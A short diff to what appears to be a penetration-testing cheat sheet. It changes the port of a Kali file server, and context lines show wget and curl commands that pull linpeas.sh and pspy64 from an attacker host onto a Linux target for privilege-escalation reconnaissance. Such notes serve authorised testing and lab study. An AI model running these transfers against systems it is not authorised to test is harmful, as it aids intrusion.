@@ -56,7 +56,7 @@ enum4linux-ng -A IP
 ## 4. File transfer
 ```
 # Kali (serve dir):
-./scripts/serve.sh 80           # sudo python3 -m http.server 80
+./scripts/serve.sh 7890         # python3 -m http.server 7890 (no sudo; pass 80 to use :80)
 # Linux target:
 wget http://KALI/linux/linpeas.sh -O /tmp/lp.sh; curl http://KALI/linux/pspy64 -o /tmp/p
 # Windows target:
